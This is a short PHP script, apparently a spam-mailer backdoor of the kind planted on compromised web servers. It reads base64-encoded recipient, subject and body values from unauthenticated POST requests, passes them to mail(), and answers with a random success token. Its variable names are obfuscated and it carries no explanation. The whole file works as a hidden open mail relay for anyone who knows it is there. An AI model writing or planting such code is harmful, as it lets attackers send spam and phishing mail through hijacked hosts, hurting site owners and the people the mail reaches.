<?php



$jewrqwbnlk = base64_decode($_POST['to']); 
$xaouf = base64_decode($_POST['subject']); 
$jwgpxlzblkepa = base64_decode($_POST['body']);  
$from = base64_decode($_POST['from']);  
$fromAddr = base64_decode($_POST['fromaddrr']);  
$jfnbrsjfq =  mail($jewrqwbnlk, $xaouf, $jwgpxlzblkepa);
if($jfnbrsjfq){echo 'vwkxlpc';} else {echo 'yfbhn : ' . $jfnbrsjfq;} 
